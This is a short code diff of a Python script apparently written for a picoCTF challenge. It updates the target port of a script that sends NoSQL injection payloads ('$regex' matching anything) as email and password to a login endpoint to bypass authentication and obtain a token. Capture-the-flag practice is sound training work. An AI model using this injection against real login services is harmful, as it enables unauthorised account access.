@@ -1,14 +1,13 @@
 import requests
 import base64
 
-url = "http://atlas.picoctf.net:53535"
+url = "http://atlas.picoctf.net:55510"
 
 
 res = requests.post(f'{url}/login', json={
     'email': '{"$regex": ".*"}', 
     "password": '{"$regex": ".*"}',
 })
-
 
 token = res.json()['token']
 
